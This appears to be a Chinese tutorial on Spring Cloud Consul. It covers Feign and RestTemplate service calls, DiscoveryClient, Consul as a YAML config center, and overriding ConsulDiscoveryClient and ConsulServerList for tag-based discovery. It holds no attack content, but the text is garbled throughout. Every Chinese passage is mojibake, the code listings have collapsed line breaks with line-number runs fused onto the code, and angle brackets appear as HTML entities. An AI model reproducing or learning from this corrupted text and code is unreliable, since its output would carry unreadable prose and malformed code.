Consul Consumer Ribbon çš„ä¸»å¯åŠ¨ç±»ï¼š 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class ConsumerRibbonApplication { public static void main(String[] args) { SpringApplication.run(ConsumerRibbonApplication.class, args); }} åˆ›å»º Consul Consumer Ribbon çš„æœåŠ¡æ¥å£ç±»ï¼Œç”¨äºè°ƒç”¨ Provider æœåŠ¡ï¼š 123456@FeignClient("consul-provider")public interface ProviderService { @RequestMapping(value = "/provider/sayHello/{name}", method = RequestMethod.GET) public String sayHello(@PathVariable("name") String name);} åˆ›å»º Consul Consumer Ribbon çš„åŸºç¡€é…ç½®ç±»ï¼Œå£°æ˜ RestTemplate çš„ Bean å¯¹è±¡ï¼š 123456789@Configurationpublic class CommonConfiguration { @Bean @LoadBalanced public RestTemplate restTemplate() { return new RestTemplate(); }} åˆ›å»º Consul Consumer Ribbon çš„æµ‹è¯•æ§åˆ¶ç±»ï¼Œå»ºç«‹ä¸¤ä¸ª REST æ¥å£ï¼Œä¸€ä¸ªé€šè¿‡ Feign çš„æ–¹å¼è®¿é—® Providerï¼Œå¦ä¸€ä¸ªé€šè¿‡ RestTemplate çš„æ–¹å¼è®¿é—® Providerï¼š 1234567891011121314151617181920212223242526@RestControllerpublic class ConsumerRibbonController { private static final String URL = "http://consul-provider"; @Autowired private RestTemplate restTemplate; @Autowired private ProviderService providerService; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/consumer/sayHelloOne/{name}") public String sayHelloOne(@PathVariable("name") String name) { return providerService.sayHello(name); } @GetMapping("/consumer/sayHelloTwo/{name}") public String sayHelloTwo(@PathVariable("name") String name) { return restTemplate.getForObject(URL + "/provider/sayHello/" + name, String.class); }} åˆ›å»º Consul Consumer Ribbon çš„ application.yml é…ç½®æ–‡ä»¶ï¼š 12345678910111213server: port: 9003spring: application: name: consul-consumer-ribbon cloud: consul: host: 127.0.0.1 # consul å¯åŠ¨åœ°å€ port: 8500 # consul å¯åŠ¨ç«¯å£ discovery: server-list-query-tags: consul-provider: tag1 # åœ¨è°ƒç”¨ consul-provider æœåŠ¡æ—¶ï¼Œä½¿ç”¨ tag1 å¯¹åº”çš„æœåŠ¡å®ä¾‹ 4. åˆ›å»º Consul Consumer Discovery Client å·¥ç¨‹åˆ›å»º Consul Consumer Discovery Client çš„ä¸»å¯åŠ¨ç±»ï¼š 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class DiscoveryClientApplication { public static void main(String[] args) { SpringApplication.run(DiscoveryClientApplication.class, args); }} åˆ›å»º Consul Consumer Discovery Client çš„æµ‹è¯•æ§åˆ¶ç±»ï¼Œä½¿ç”¨ DiscoveryClient æ³¨å…¥çš„æ–¹å¼ï¼Œæ‰‹åŠ¨å» Consul ä¸­è·å–æœåŠ¡åˆ—è¡¨ï¼›è¿™é‡Œéœ€è¦è¯´æ˜çš„æ˜¯ï¼ŒConsulDiscoveryClient ä¸­ä¸æ”¯æŒæ ¹æ®è‡ªå®šä¹‰ Tags è·å–æœåŠ¡æä¾›è€…ï¼š 12345678910111213141516@RestControllerpublic class TestController { @Autowired private DiscoveryClient discoveryClient; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/getServer/{serviceId}") public List&lt;ServiceInstance&gt; getServer(@PathVariable("serviceId") String serviceId) { return discoveryClient.getInstances(serviceId); }} åˆ›å»º Consul Consumer Discovery Client çš„ application.yml é…ç½®æ–‡ä»¶ï¼š 12345678910server: port: 9004spring: application: name: consul-consumer-discovery-client cloud: consul: host: 127.0.0.1 # consul å¯åŠ¨åœ°å€ port: 8500 # consul å¯åŠ¨ç«¯å£ 5. æµ‹è¯•ç»“æœ å¯åŠ¨æœ¬åœ°çš„ Consul æœåŠ¡å™¨ï¼Œæ‰“å¼€ Consul çš„ç®¡ç†ç•Œé¢ï¼ŒæŸ¥çœ‹æœåŠ¡çš„æ³¨å†Œæƒ…å†µï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä¾æ¬¡å¯åŠ¨ consul-provider-tag-oneã€consul-provider-tag-twoã€consul-consumer-discovery-clientã€consul-consumer-ribbon åº”ç”¨ è¯·æ±‚ consul-consumer-ribbon åº”ç”¨çš„ Feign æ¥å£ï¼Œè®¿é—® http://127.0.0.1:9003/consumer/sayHelloOne/Jimï¼ŒæŸ¥çœ‹è¿”å›çš„å†…å®¹æ˜¯å¦ä¸º from port 9001: hello Jim è¯·æ±‚ consul-consumer-ribbon åº”ç”¨çš„ RestTemplate æ¥å£ï¼Œè®¿é—® http://127.0.0.1:9003/consumer/sayHelloTwo/Peterï¼ŒæŸ¥çœ‹è¿”å›çš„å†…å®¹æ˜¯å¦ä¸º from port 9001: hello Peter è¯·æ±‚ consul-consumer-discovery-client åº”ç”¨çš„æ¥å£ï¼Œè®¿é—® http://127.0.0.1:9004/getServer/consul-providerï¼ŒæŸ¥çœ‹è¿”å›çš„æœåŠ¡æä¾›è€…ä¿¡æ¯æ˜¯å¦åªæœ‰ consul-provider æä¾›è€…ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š Spring Cloud Consul Configä¸Šé¢çš„ç¤ºä¾‹æ¼”ç¤ºäº† Spring Cloud Consul Config è·å–å’Œåˆ·æ–°é…ç½®çš„ç®€å•ç”¨æ³•ã€‚Spring Cloud Consul Config ä¸ Consul æ˜¯é€šè¿‡ HTTP è¿›è¡Œäº¤äº’çš„ï¼Œé‚£é…ç½®åˆ·æ–°æ˜¯å¦‚ä½•åšåˆ°çš„å‘¢ï¼Ÿå¦å¤–ï¼Œç¤ºä¾‹ä¸­åªæœ‰ä¸€æ¡é…ç½®ï¼Œå¯æ˜¯å®é™…å·¥ä½œä¸­çš„é…ç½®å¯èƒ½æœ‰æˆç™¾ä¸Šåƒæ¡ï¼Œéš¾é“é…ç½®ä¿¡æ¯éœ€è¦ä¸€ä¸ªä¸ªåœ¨ Consul çš„ç®¡ç†é¡µé¢ä¸­æ·»åŠ å—ï¼Ÿ é…ç½®åˆ·æ–°åŸç†Spring Cloud Consul æ˜¯é€šè¿‡ HTTP çš„æ–¹å¼è·Ÿ Consul äº¤äº’ï¼Œé‚£é…ç½®æ˜¯å¦‚ä½•å®æ—¶ç”Ÿæ•ˆçš„å‘¢ï¼Ÿç­”æ¡ˆå…¶å®å¾ˆç®€å•ï¼Œé‚£å°±æ˜¯é…ç½®å¹¶æ²¡æœ‰å®æ—¶ç”Ÿæ•ˆã€‚org.springframework.cloud.consul.config.ConfigWatch ä¸­æœ‰ä¸€ä¸ªå®šæ—¶æ–¹æ³• watchConfigKeyValues()ï¼Œå®ƒé»˜è®¤æ¯ç§’æ‰§è¡Œä¸€æ¬¡ï¼ˆå¯ä»¥é€šè¿‡ spring.cloud.consul.config.watch.delay è‡ªå®šä¹‰æ‰§è¡Œçš„æ—¶é—´é—´éš”)ï¼Œå» Consul ä¸­è·å–æœ€æ–°çš„é…ç½®ä¿¡æ¯ï¼Œä¸€æ—¦é…ç½®å‘ç”Ÿæ”¹å˜ï¼ŒSpring é€šè¿‡ ApplicationEventPublisher é‡æ–°åˆ·æ–°é…ç½®ã€‚Consul Config ç»„ä»¶å°±æ˜¯é€šè¿‡è¿™ç§æ–¹å¼ï¼Œè¾¾åˆ°é…ç½® â€œå®æ—¶ç”Ÿæ•ˆâ€ çš„ç›®çš„ã€‚é‚£å®¢æˆ·ç«¯å¦‚ä½•å¾—çŸ¥é…ç½®è¢«æ›´æ–°è¿‡äº†å‘¢ï¼Œç­”æ¡ˆåœ¨ Consul è¿”å›çš„æ•°æ®é‡Œã€‚Consul ä¼šç»™æ¯ä¸€é¡¹é…ç½®åŠ ä¸€ä¸ª consulIndex å±æ€§ï¼Œç±»ä¼¼äºç‰ˆæœ¬å·ï¼Œå¦‚æœé…ç½®æ›´æ–°ï¼Œå®ƒå°±ä¼šè‡ªå¢ã€‚Spring Cloud Consul Config å°±æ˜¯é€šè¿‡ç¼“å­˜ consulIndex æ¥åˆ¤æ–­é…ç½®æ˜¯å¦å‘ç”Ÿæ”¹å˜ã€‚ é«˜çº§é…ç½®ï¼ˆä½œä¸ºé…ç½®ä¸­å¿ƒï¼‰Consul åªæ”¯æŒç”¨ K/V çš„æ–¹å¼è¿›è¡Œé…ç½®ï¼Œé‚£æ€ä¹ˆè®© Consul æ”¯æŒåŒæ—¶é…ç½®å¤šæ¡çš„æ–¹å¼å‘¢ï¼Ÿéš¾é“è¦ç»™ Consul å¢åŠ ä¸€ä¸ªå¯¼å…¥åŠŸèƒ½å—ï¼Ÿå…¶å® K/V ä¸ä»…å¯ä»¥ä»£è¡¨ä¸€æ¡é…ç½®ï¼Œè¿˜å¯ä»¥ä»£è¡¨ä¸€ä¸ªåº”ç”¨çš„é…ç½®ï¼Œå°†åº”ç”¨åä½œä¸º Keyï¼ŒValue ä¸­ç”¨æ¥å­˜æ”¾å®ƒæ‰€æœ‰çš„é…ç½®ï¼Œè¿™æ ·å°±å¯ä»¥è¾¾åˆ°åŒæ—¶é…ç½®å¤šæ¡çš„ç»“æœã€‚Spring Cloud Consul Config å°±æ˜¯è¿™æ ·ï¼Œé€šè¿‡å°† yml æˆ–è€… properties æ”¾åœ¨ Value ä¸­æ¥å®ç°é…ç½®çš„æ‰¹é‡æ“ä½œã€‚ä¸‹é¢çš„ç¤ºä¾‹å°†æ¼”ç¤ºä½¿ç”¨ Consul çš„é…ç½®åŠŸèƒ½ï¼Œå°†æ•´ä¸ªåº”ç”¨çš„é…ç½®ä»¥ yml çš„æ–¹å¼å­˜å‚¨åœ¨ Consul ä¸­ï¼Œä»¥æ­¤å®ç°ç±»ä¼¼ Spring Cloud Config çš„é…ç½®ä¸­å¿ƒåŠŸèƒ½ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ åˆ›å»º Consul Config Customize å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-consul-config&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Consul Config Customize çš„ä¸»å¯åŠ¨ç±»ï¼š 1234567@SpringBootApplicationpublic class ConfigApplication { public static void main(String[] args) { SpringApplication.run(ConfigApplication.class, args); }} åˆ›å»º Consul Config Customize çš„æµ‹è¯•æ§åˆ¶ç±»ï¼š 12345678910111213@RefreshScope@RestController@RequestMapping("/config")public class TestController { @Value("${foo.bar.name}") private String name; @GetMapping("/getName") public String getName() { return name; }} åˆ›å»º Consul Config Customize çš„ application.yml é…ç½®æ–‡ä»¶ï¼š 12345spring: application: name: consul-config-customize profiles: active: dev åˆ›å»º Consul Config Customize çš„ bootstrap.yml é…ç½®æ–‡ä»¶ï¼Œå¢åŠ è‡ªå®šä¹‰çš„é…ç½®å±æ€§ï¼š 1234567891011spring: cloud: consul: config: host: 127.0.0.1 # Consul å¯åŠ¨åœ°å€ port: 8500 # Consul å¯åŠ¨ç«¯å£ format: yaml # Consul ä¸­ Value é…ç½®æ ¼å¼ä¸º yaml prefix: configuration # Consul ä¸­é…ç½®æ–‡ä»¶ç›®å½•ä¸º configuration, é»˜è®¤ä¸º config default-context: app # å»è¯¥ç›®å½•ä¸‹æŸ¥æ‰¾ç¼ºçœé…ç½®, é»˜è®¤ä¸º application profile-separator: \':\' # profilesé…ç½®åˆ†éš”ç¬¦, é»˜è®¤ä¸ºâ€˜,â€™ data-key: data # å¦‚æœæŒ‡å®šé…ç½®æ ¼å¼ä¸º yaml æˆ–è€… properties, åˆ™éœ€è¦è¯¥å€¼ä½œä¸ºkey, é»˜è®¤ä¸º data æµ‹è¯•ç»“æœï¼š å¯åŠ¨æœ¬åœ°çš„ Consul æœåŠ¡å™¨ è®¿é—® http://127.0.0.1:8500/ui/dc1/kv é¡µé¢ï¼Œæ·»åŠ  key ä¸ºï¼šconfiguration/consul-config-customize:dev/dataï¼Œvalue ä¸ºï¼š 12345server: port: 9002foo: bar: name: book-dev è®¿é—® http://127.0.0.1:8500/ui/dc1/kv é¡µé¢ï¼Œæ·»åŠ  key ä¸ºï¼šconfiguration/consul-config-customize:test/dataï¼Œvalue ä¸ºï¼š 12345server: port: 9003foo: bar: name: book-test å¯åŠ¨ consul-config-customize åº”ç”¨ï¼ŒæŸ¥çœ‹å¯åŠ¨çš„ç«¯å£å·ï¼›è®¿é—® http://127.0.0.1:9002/config/getNameï¼ŒæŸ¥çœ‹æ¥å£è¿”å›çš„å†…å®¹ æ›´æ”¹ application.yml ä¸­çš„é…ç½®ä¸º spring.profiles.active=test é‡æ–°å¯åŠ¨ consul-config-customize åº”ç”¨ï¼ŒæŸ¥çœ‹å¯åŠ¨çš„ç«¯å£å·ï¼›è®¿é—® http://127.0.0.1:9003/config/getNameï¼ŒæŸ¥çœ‹æ¥å£è¿”å›çš„å†…å®¹ Spring Cloud Consul åŠŸèƒ½é‡å†™Spring Cloud Consul æä¾›äº†å¾ˆå¤šæ–¹ä¾¿å®ç”¨çš„åŠŸèƒ½ï¼Œä½†æ˜¯é¢å¯¹äº”èŠ±å…«é—¨çš„éœ€æ±‚ï¼Œè¿˜æ˜¯å¸Œæœ›å¯ä»¥é‡å†™å®ƒçš„åŸæœ‰é€»è¾‘ã€‚ é‡å†™ ConsulDiscoveryClient (æ”¯æŒ Tag)ConsulDiscoveryClient å¹¶ä¸æ”¯æŒæ ¹æ®è‡ªå®šä¹‰ Tag è·å–æœåŠ¡ï¼Œä¸€èˆ¬æ¥è¯´ï¼ŒConsulServerList å’Œ ConsulDiscoveryClient è™½ç„¶é¢å¯¹çš„éœ€æ±‚ä¸åŒï¼Œä½†æ˜¯å®ç°çš„åŠŸèƒ½éƒ½æ˜¯ä¸€æ ·çš„ï¼Œé‚£å°±æ˜¯æ ¹æ®æ¡ä»¶æŸ¥æ‰¾æœåŠ¡ã€‚å¯èƒ½ Spring è®¤ä¸º ConsulDiscoveryClient æ˜¯ä¸ºä¸€äº›æ¡†æ¶å‹çš„åŠŸèƒ½å‡†å¤‡çš„ï¼Œç”¨æˆ·å®Œå…¨å¯ä»¥æ‹¿åˆ°æœåŠ¡åˆ—è¡¨åè‡ªè¡Œç­›é€‰æ‰€éœ€çš„æ•°æ®ã€‚ä¸‹é¢çš„ç¤ºä¾‹å°†é‡å†™ ConsulDiscoveryClient çš„åŠŸèƒ½ï¼Œè®©å…¶æ”¯æŒæ ¹æ®è‡ªå®šä¹‰ Tag è·å–æœåŠ¡ã€‚é¦–å…ˆåˆ›å»ºä¸‰ä¸ªå·¥ç¨‹ï¼Œåˆ†åˆ«æ˜¯ï¼šconsul-provider-tag-oneã€consul-provider-tag-twoã€consul-consumer-overrideï¼Œå…¶ä¸­å‰ä¸¤ä¸ªå·¥ç¨‹ä¸ä¸Šé¢çš„æœåŠ¡å‘ç°æ¡ˆä¾‹é‡Œçš„é…ç½®å’Œä»£ç å®Œå…¨ä¸€è‡´ï¼Œè¿™é‡Œä¸å†ç´¯è¿°ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ Consul Consumer Override å·¥ç¨‹é‡Œçš„ MyConsulDiscoveryClient ç±»ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071public class MyConsulDiscoveryClient implements DiscoveryClient { private final ConsulClient client; private final ConsulDiscoveryProperties properties; public MyConsulDiscoveryClient(ConsulClient client, ConsulDiscoveryProperties properties) { this.client = client; this.properties = properties; } @Override public String description() { return "Spring Cloud Consul Discovery Client"; } @Override public List&lt;ServiceInstance&gt; getInstances(final String serviceId) { return getInstances(serviceId, QueryParams.DEFAULT); } public List&lt;ServiceInstance&gt; getInstances(final String serviceId, final QueryParams queryParams) { List&lt;ServiceInstance&gt; instances = new ArrayList&lt;&gt;(); addInstancesToList(instances, serviceId, queryParams); return instances; } private void addInstancesToList(List&lt;ServiceInstance&gt; instances, String serviceId, QueryParams queryParams) { String aclToken = properties.getAclToken(); Response&lt;List&lt;HealthService&gt;&gt; services; if (StringUtils.hasText(aclToken)) { // è¿™é‡Œç”±è·å–é»˜è®¤tagæ”¹ä¸ºè·å–æŒ‡å®štag services = client.getHealthServices(serviceId, getTag(serviceId), this.properties.isQueryPassing(), queryParams, aclToken); } else { // è¿™é‡Œç”±è·å–é»˜è®¤tagæ”¹ä¸ºè·å–æŒ‡å®štag services = client.getHealthServices(serviceId, getTag(serviceId), this.properties.isQueryPassing(), queryParams); } for (HealthService service : services.getValue()) { String host = ConsulServerUtils.findHost(service); Map&lt;String, String&gt; metadata = ConsulServerUtils.getMetadata(service); boolean secure = false; if (metadata.containsKey("secure")) { secure = Boolean.parseBoolean(metadata.get("secure")); } instances.add(new DefaultServiceInstance(serviceId, host, service.getService().getPort(), secure, metadata)); } } public List&lt;ServiceInstance&gt; getAllInstances() { List&lt;ServiceInstance&gt; instances = new ArrayList&lt;&gt;(); Response&lt;Map&lt;String, List&lt;String&gt;&gt;&gt; services = client.getCatalogServices(QueryParams.DEFAULT); for (String serviceId : services.getValue().keySet()) { addInstancesToList(instances, serviceId, QueryParams.DEFAULT); } return instances; } @Override public List&lt;String&gt; getServices() { String aclToken = properties.getAclToken(); if (StringUtils.hasText(aclToken)) { return new ArrayList&lt;&gt;(client.getCatalogServices(QueryParams.DEFAULT, aclToken).getValue().keySet()); } else { return new ArrayList&lt;&gt;(client.getCatalogServices(QueryParams.DEFAULT).getValue().keySet()); } } // è·å–tagçš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åœ¨ ConsulServerList ä¸­å·²å­˜åœ¨ protected String getTag(String serviceId) { return this.properties.getQueryTagForService(serviceId); }} Consul Consumer Override å·¥ç¨‹é‡Œçš„é…ç½®ç±»ï¼š 123456789@Configurationpublic class CommonConfiguration { @Bean @Order(Ordered.HIGHEST_PRECEDENCE) // ä¿è¯ä¼˜å…ˆè¢«SpringåŠ è½½ public MyConsulDiscoveryClient discoveryClient(ConsulClient client, ConsulDiscoveryProperties properties) { return new MyConsulDiscoveryClient(client, properties); }} Consul Consumer Override å·¥ç¨‹é‡Œçš„æµ‹è¯•æ§åˆ¶ç±»ï¼š 12345678910111213141516@RestControllerpublic class TestController { @Autowired private DiscoveryClient discoveryClient; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/getServer/{serviceId}") public List&lt;ServiceInstance&gt; getServer(@PathVariable("serviceId") String serviceId) { return discoveryClient.getInstances(serviceId); }} Consul Consumer Override å·¥ç¨‹é‡Œçš„ application.yml é…ç½®æ–‡ä»¶ï¼š 12345678910111213server: port: 9004spring: application: name: consul-consumer-discovery-client cloud: consul: host: 127.0.0.1 # consul å¯åŠ¨åœ°å€ port: 8500 # consul å¯åŠ¨ç«¯å£ discovery: server-list-query-tags: consul-provider: tag1 # åœ¨è°ƒç”¨ consul-provider æœåŠ¡æ—¶ï¼Œä½¿ç”¨ tag1 å¯¹åº”çš„æœåŠ¡å®ä¾‹ æµ‹è¯•ç»“æœï¼š å¯åŠ¨æœ¬åœ°çš„ Consul æœåŠ¡å™¨ ä¾æ¬¡å¯åŠ¨ consul-provider-tag-oneã€consul-provider-tag-twoã€consul-consumer-override åº”ç”¨ è®¿é—® http://127.0.0.1:9004/getServer/consul-providerï¼ŒæŸ¥çœ‹æ¥å£è¿”å›çš„ä¿¡æ¯ï¼Œçœ‹çœ‹æ˜¯å¦åªè¿”å›äº† tag1 å¯¹åº”çš„æœåŠ¡å®ä¾‹ é‡å†™ ConsulServerListåŸç†åˆ†æå•çº¯çš„è‡ªå®šä¹‰å®ç° ServerList çš„æ¥å£å¹¶ä¸èƒ½è¾¾åˆ°é‡å†™ ConsulServerList çš„ç›®çš„ï¼Œæ˜¯å› ä¸º ConsulServerList çš„ serviceId å±æ€§ä¸º null æ—¶ä¼šå¯¼è‡´å¯åŠ¨æŠ¥é”™ã€‚è¿™ä¸ª serviceId å±æ€§è¡¨ç¤ºæœåŠ¡æä¾›è€…çš„åç§°ï¼Œä½†æ˜¯å´ä½œä¸º ConsulServerList çš„æˆå‘˜å˜é‡ã€‚ç”±æ­¤å¯ä»¥è”æƒ³åˆ°ï¼ŒSpring Cloud Consul ä¸ºæ¯ä¸ªæœåŠ¡æä¾›è€…éƒ½åˆ›å»ºäº†ä¸€ä¸ª ConsulServerList å®ä¾‹ï¼Œè¿™æ˜¯ä¸ºäº†æ”¯æŒ Ribbon çš„æœåŠ¡é…ç½®ä¸ªæ€§åŒ–ã€‚Ribbon æ”¯æŒå¯¹æŸä¸€ä¸ªæœåŠ¡å•ç‹¬é…ç½®è´Ÿè½½ï¼Œæ¯”å¦‚è´Ÿè½½ç®—æ³•ï¼Œæ˜¯å¦é‡è¯•ç­‰ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬æœåŠ¡å‘ç°é€»è¾‘ï¼Œä¸ºæ¯ä¸€ä¸ªæœåŠ¡å®ä¾‹åŒ–ä¸€ä¸ªæœåŠ¡å‘ç°é€»è¾‘ï¼Œå¯ä»¥æœ€å¤§åŒ–åœ°å°†è‡ªç”±äº¤ç»™å®ç°æ–¹ã€‚ç‰¹åˆ«æ³¨æ„ï¼ŒConsulServerList å¹¶ä¸æ˜¯åœ¨ Spring å¯åŠ¨çš„æ—¶å€™åˆå§‹åŒ–ï¼Œè€Œæ˜¯åœ¨æœåŠ¡è°ƒç”¨æ—¶é€šè¿‡ Ribbon è¿›è¡Œåˆå§‹åŒ–ï¼Œå…·ä½“çš„åˆå§‹åŒ–æµç¨‹å¦‚ä¸‹ï¼š Feign é€šè¿‡ serviceId å» Ribbon ä¸­è·å–æœåŠ¡ç«¯é…ç½® Ribbon æ ¹æ® serviceId å»ç¼“å­˜ä¸­æ‰¾æ˜¯å¦å­˜åœ¨è¿™ä¸ªåç§°çš„ AnnotationConfigApplicationContext å®ä¾‹ï¼Œå¦‚æœæœ‰å°±ç«‹å³è¿”å›ï¼›å¦‚æœæ²¡æœ‰å°±åˆ›å»ºä¸€ä¸ªï¼Œè€Œåˆ›å»º AnnotationConfigApplicationContext çš„è¿‡ç¨‹ï¼Œå°±æ˜¯ ConsulServerList åˆå§‹åŒ–çš„è¿‡ç¨‹ AnnotationConfigApplicationContext è·Ÿ ConsulServerList æ˜¯é€šè¿‡ @RibbonClient æ³¨è§£å…³è”åœ¨ä¸€èµ·çš„ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ RibbonClientConfigurationRegistrar æºç  æ‰€ä»¥é‡å†™ ConsulServerList çš„è¿‡ç¨‹æ¯”è¾ƒéº»çƒ¦ï¼Œè¦ä¹ˆé‡æ–°å†™ä¸€å¥—ç±»ä¼¼çš„ spring-cloud-consul-discovery æºç ï¼Œè¦ä¹ˆå°±ä»æºå¤´çš„ RibbonClientConfiguration å¼€å§‹ç›´åˆ° ConsulServerList å‡æ”¹æˆè‡ªå·±çš„å®ç°ã€‚ é‡å†™ç¤ºä¾‹ä¸‹é¢çš„ç¤ºä¾‹å°†ä½¿ç”¨ç¬¬äºŒç§æ–¹å¼é‡å†™ ConsulServerListï¼Œé¦–å…ˆåˆ›å»ºä¸‰ä¸ªå·¥ç¨‹ï¼Œåˆ†åˆ«æ˜¯ï¼šconsul-provider-tag-oneã€consul-provider-tag-twoã€consul-consumer-overrideï¼Œå…¶ä¸­å‰ä¸¤ä¸ªå·¥ç¨‹ä¸ä¸Šé¢çš„æœåŠ¡å‘ç°æ¡ˆä¾‹é‡Œçš„é…ç½®å’Œä»£ç å®Œå…¨ä¸€è‡´ï¼Œè¿™é‡Œä¸å†ç´¯è¿°ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨ Consul Consumer Override å·¥ç¨‹é‡Œæ–°å¢ MyConsulServerListã€MyConsulRibbonClientConfigurationã€MyRibbonConsulAutoConfiguration ç±»ï¼Œéœ€è¦ä¿è¯ MyConsulRibbonClientConfiguration ç±»ä¸èƒ½ä¸è¢« @ConponentScan ä¿®é¥°çš„ä¸»ç±»æ”¾åœ¨åŒä¸€ä¸ªåŒ…æˆ–å…¶å­åŒ…ä¸‹ï¼Œå¦åˆ™ä¼šå¯¼è‡´ IClientConfig çš„ Bean æ— æ³•æ³¨å…¥ã€‚ Consul Consumer Override å·¥ç¨‹é‡Œçš„ MyConsulServerList ç±»ï¼š 12345678910111213141516171819202122232425262728293031323334public class MyConsulServerList extends AbstractServerList&lt;ConsulServer&gt; { private String serviceId; private final ConsulClient client; private final ConsulDiscoveryProperties properties; private static final Logger logger = LoggerFactory.getLogger(MyConsulServerList.class); public MyConsulServerList(ConsulClient client, ConsulDiscoveryProperties properties) { this.client = client; this.properties = properties; } /** * æ‰“å°ä¸€å¥æç¤º */ private List&lt;ConsulServer&gt; getServers() { if (this.client == null) { return Collections.emptyList(); } logger.info("===== è‡ªå®šä¹‰æœåŠ¡å‘ç° ====="); String tag = getTag(); // null is ok Response&lt;List&lt;HealthService&gt;&gt; response = this.client.getHealthServices( this.serviceId, tag, this.properties.isQueryPassing(), createQueryParamsForClientRequest(), this.properties.getAclToken()); if (response.getValue() == null || response.getValue().isEmpty()) { return Collections.emptyList(); } return transformResponse(response.getValue()); } // çœç•¥å…¶ä»–ä»£ç  ....} Consul Consumer Override å·¥ç¨‹é‡Œçš„ MyConsulRibbonClientConfiguration ç±»ï¼š 123456789101112131415161718192021222324252627282930313233343536@Configurationpublic class MyConsulRibbonClientConfiguration { @Autowired private ConsulClient client; private String serviceId = "client"; protected static final String VALUE_NOT_SET = "__not__set__"; protected static final String DEFAULT_NAMESPACE = "ribbon"; public MyConsulRibbonClientConfiguration() { } public MyConsulRibbonClientConfiguration(String serviceId) { this.serviceId = serviceId; } /** * å°†ServerListç”Ÿæ•ˆçš„å®ç°æ”¹ä¸ºMyServerList * * @param config * @param properties * @return */ @Bean @ConditionalOnMissingBean public ServerList&lt;?&gt; ribbonServerList(IClientConfig config, ConsulDiscoveryProperties properties) { MyConsulServerList serverList = new MyConsulServerList(client, properties); serverList.initWithNiwsConfig(config); return serverList; } // çœç•¥å…¶ä»–ä»£ç  ....} Consul Consumer Override å·¥ç¨‹é‡Œçš„ MyRibbonConsulAutoConfiguration ç±»ï¼š 12345678910111213/** * è¯¥ç±»ä¸»è¦æ˜¯å°†åŸæœ‰å…¥å£å–ä»£, å› æ­¤å®ƒçš„ç”Ÿæ•ˆé€»è¾‘åˆšå¥½è·Ÿ RibbonConsulAutoConfiguration ç›¸å * å½“ spring.cloud.consul.ribbon.enabled ä¸º false æ—¶, è¿™é‡Œé‡å†™çš„é€»è¾‘ç”Ÿæ•ˆ */@Configuration@ConditionalOnConsulEnabled@ConditionalOnBean(SpringClientFactory.class)@AutoConfigureAfter(RibbonAutoConfiguration.class)@ConditionalOnExpression("${spring.cloud.consul.ribbon.enabled:true}==false")@RibbonClients(defaultConfiguration = MyConsulRibbonClientConfiguration.class)public class MyRibbonConsulAutoConfiguration {} åœ¨ Consul Consumer Override å·¥ç¨‹é‡Œé‡Œåˆ›å»º /src/main/resources/META-INF/spring.factories é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä¸Šé¢çš„è‡ªåŠ¨é…ç½®ç±»ï¼š 12org.springframework.boot.autoconfigure.EnableAutoConfiguration=\\ com.springcloud.override.consul.MyRibbonConsulAutoConfiguration Consul Consumer Override å·¥ç¨‹é‡Œçš„å¯åŠ¨ä¸»ç±»ï¼š 123456789@EnableFeignClients@EnableDiscoveryClient@SpringBootApplicationpublic class ConsumerOverrideApplication { public static void main(String[] args) { SpringApplication.run(ConsumerOverrideApplication.class, args); }} Consul Consumer Override å·¥ç¨‹é‡Œçš„æœåŠ¡æ¥å£ç±»ï¼Œç”¨äºè°ƒç”¨ Provider æœåŠ¡ï¼š 123456@FeignClient("consul-provider")public interface ProviderService { @RequestMapping(value = "/provider/sayHello/{name}", method = RequestMethod.GET) public String sayHello(@PathVariable("name") String name);} Consul Consumer Override å·¥ç¨‹é‡Œçš„æµ‹è¯•æ§åˆ¶ç±»ï¼š 12345678910111213141516171819@RestControllerpublic class TestController { @Autowired private DiscoveryClient discoveryClient; @Autowired private ProviderService providerService; @GetMapping("/actuator/health") public String health() { return "SUCCESS"; } @GetMapping("/sayHello/{name}") public String getServer(@PathVariable("name") String name) { return providerService.sayHello(name); }} Consul Consumer Override å·¥ç¨‹é‡Œçš„ application.yml 123456789101112server: port: 9004spring: application: name: consul-consumer-discovery-client cloud: consul: host: 127.0.0.1 # consul å¯åŠ¨åœ°å€ port: 8500 # consul å¯åŠ¨ç«¯å£ ribbon: enabled: false # æ­¤å¤„é…ç½®å¾ˆé‡è¦,ä¸º true æ—¶èµ°åŸæœ‰é€»è¾‘, ä¸º false æ—¶èµ°é‡å†™é€»è¾‘ æµ‹è¯•ç»“æœï¼š å¯åŠ¨æœ¬åœ°çš„ Consul æœåŠ¡å™¨ ä¾æ¬¡å¯åŠ¨ consul-provider-tag-oneã€consul-provider-tag-twoã€consul-consumer-override åº”ç”¨ è®¿é—® http://127.0.0.1:9004/sayHello/Peterï¼ŒæŸ¥çœ‹æ¥å£æ˜¯å¦æ­£å¸¸è¿”å›å†…å®¹ï¼Œæ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼š 1234c.netflix.loadbalancer.BaseLoadBalancer : Client: consul-provider instantiated a LoadBalancer: DynamicServerListLoadBalancer:{NFLoadBalancer:name=consul ...c.n.l.DynamicServerListLoadBalancer : Using serverListUpdater 